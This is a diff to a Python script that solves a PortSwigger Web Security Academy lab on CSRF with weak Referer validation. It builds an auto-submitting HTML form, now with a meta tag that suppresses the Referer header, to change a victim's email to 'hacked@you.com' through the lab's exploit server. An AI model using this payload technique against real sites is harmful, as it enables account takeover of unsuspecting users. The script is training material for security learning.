@@ -1,16 +1,17 @@
-##############################################################################################
+#######################################################################################
 #
 # Author: Ahmed Elqalawy (@elqal3awii)
 #
 # Date: 21/10/2023
 #
-# Lab: CSRF vulnerability with no defenses
+# Lab: CSRF where Referer validation depends on header being present
 #
-# Steps: 1. Craft an HTML form for changing the email address with an auto-submit script
+# Steps: 1. Craft an HTML form for changing the email address with an auto-submit 
+#           script and a meta tag that drops the Referer header from the request
 #        2. Deliver the exploit to the victim
 #        3. The victim's email will be changed after he trigger the exploit
 #
-##############################################################################################
+#######################################################################################
 
 
 ###########
@@ -19,16 +20,15 @@
 import requests
 from colorama import Fore
 
-
 #########
 # Main
 #########
 
 # change this to your lab URL
-lab_url = "https://0ac300660457354a80fdc17d008e000f.web-security-academy.net"
+lab_url = "https://0a1a000103849ea38086a39e006c0091.web-security-academy.net"
 
 # change this to your exploit server URL
-exploit_server_url = "https://exploit-0a7e00bd04a235f880eac08e019d00ff.exploit-server.net"
+exploit_server_url = "https://exploit-0a97005303699e6d8093a2a8014100d4.exploit-server.net"
 
 # the header of your exploit sever response
 exploit_server_head = """HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"""
@@ -40,6 +40,7 @@ new_email = "hacked@you.com"
 # payload to change the victim's email
 payload = f"""<html>
                 <body>
+                <meta name="referrer" content="never">
                 <form action="{lab_url}/my-account/change-email" method="POST">
                     <input type="hidden" name="email" value="{new_email}" />
                     <input type="submit" value="Submit request" />
